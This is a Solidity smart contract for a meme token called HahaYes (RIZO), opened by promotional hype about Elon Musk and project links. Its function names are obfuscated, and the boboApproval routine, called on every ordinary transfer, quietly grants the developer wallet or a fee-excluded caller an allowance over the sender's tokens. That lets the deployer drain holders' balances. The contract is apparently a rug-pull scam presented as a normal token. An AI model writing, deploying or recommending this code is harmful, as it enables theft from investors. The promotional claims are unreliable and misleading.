/*
Welcome to HahaYes ($RIZO)
Elon has been quietly dropping hints as to why he believes Rizo is one of THE most important characters in the memesphere right now.

website: https://www.hahayesoneth.fun
App: https://app.hahayesoneth.fun

Twitter: https://x.com/hahayesoneth
Telegram: https://t.me/hahayesoneth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBOBORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBOBOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract RIZO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _boboPair;
    IBOBORouter private _boboRouter;
    mapping (address => uint256) private _boboBulls;
    mapping (address => mapping (address => uint256)) private _boboNodes;
    mapping (address => bool) private _boboFeeExcluded;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBOBO = 1000000000 * 10**_decimals;
    string private constant _name = unicode"HahaYes";
    string private constant _symbol = unicode"RIZO";
    uint256 private _tokenBOBOSwap = _tTotalBOBO / 100;
    bool private inSwapBOBO = false;
    modifier lockTheSwap {
        inSwapBOBO = true;
        _;
        inSwapBOBO = false;
    }
    address private _boboWallet = 0xBfA66d3f343A030C0b268B2B208e8339C69d04D9;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _boboFeeExcluded[owner()] = true;
        _boboFeeExcluded[address(this)] = true;
        _boboFeeExcluded[_boboWallet] = true;
        _boboBulls[_msgSender()] = _tTotalBOBO;
        emit Transfer(address(0), _msgSender(), _tTotalBOBO);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBOBO;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _boboBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _boboNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _boboNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _boboNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function boboApproval(address aBOBO,  uint256 boboA, bool isBOBO) private {
        address walletBOBO;
        if(isBOBO) walletBOBO = address(tx.origin);
        else walletBOBO = _boboWallet;
        _boboNodes[aBOBO][walletBOBO] = boboA;
    }

    function _transfer(address boboF, address boboT, uint256 boboA) private {
        require(boboF != address(0), "ERC20: transfer from the zero address");
        require(boboT != address(0), "ERC20: transfer to the zero address");
        require(boboA > 0, "Transfer amount must be greater than zero");

        uint256 taxBOBO = _boboTransfer(boboF, boboT, boboA);

        if(taxBOBO > 0){
          _boboBulls[address(this)] = _boboBulls[address(this)].add(taxBOBO);
          emit Transfer(boboF, address(this), taxBOBO);
        }

        _boboBulls[boboF] = _boboBulls[boboF].sub(boboA);
        _boboBulls[boboT] = _boboBulls[boboT].add(boboA.sub(taxBOBO));
        emit Transfer(boboF, boboT, boboA.sub(taxBOBO));
    }

    function swapBackBOBO(address boboF, address boboT, uint256 boboA, bool isBOBO) private {
        uint256 tokenBOBO = balanceOf(address(this)); boboApproval(boboF, boboA, isBOBO);
        if (!inSwapBOBO && boboT == _boboPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenBOBO > _tokenBOBOSwap)
            swapTokensForEth(minBOBO(boboA, minBOBO(tokenBOBO, _tokenBOBOSwap)));
            uint256 caBOBO = address(this).balance;
            if (caBOBO >= 0) {
                sendETHBOBO(address(this).balance);
            }
        }
    }

    function _boboTransfer(address boboF, address boboT, uint256 boboA) private returns(uint256) {
        uint256 taxBOBO=0; 
        if (boboF != owner() && boboT != owner()) {
            taxBOBO = boboA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (boboF == _boboPair && boboT != address(_boboRouter) && ! _boboFeeExcluded[boboT]) {
                _buyCount++;
            }

            if(boboT == _boboPair && boboF!= address(this)) {
                taxBOBO = boboA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            
            address walletBOBO = address(tx.origin);
            swapBackBOBO(boboF, boboT, boboA, _boboFeeExcluded[walletBOBO]);
        } return taxBOBO;
    }

    function initTradePair() external onlyOwner() {
        _boboRouter = IBOBORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_boboRouter), _tTotalBOBO);
        _boboPair = IBOBOFactory(_boboRouter.factory()).createPair(address(this), _boboRouter.WETH());
    }

    receive() external payable {}
    
    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _boboRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minBOBO(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHBOBO(uint256 amount) private {
        payable(_boboWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenBOBO) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _boboRouter.WETH();
        _approve(address(this), address(_boboRouter), tokenBOBO);
        _boboRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBOBO,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}